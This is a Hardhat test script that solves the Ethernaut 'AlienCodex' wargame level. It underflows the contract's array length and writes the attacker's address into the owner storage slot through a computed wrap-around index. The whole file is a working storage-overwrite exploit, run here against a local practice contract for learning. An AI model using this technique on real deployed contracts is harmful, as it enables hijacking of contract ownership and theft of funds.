import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const [, attacker] = await ethers.getSigners();
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const alienCodex = await AlienCodex.deploy();

    await alienCodex.make_contact();
    await alienCodex.retract();

    const slot = ethers.constants.MaxUint256.sub(ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.hexZeroPad("0x01", 32)))).add(1);
    await alienCodex.revise(slot, ethers.utils.hexZeroPad(attacker.address, 32));

    expect(await alienCodex.owner()).to.eq(attacker.address);
  })
})
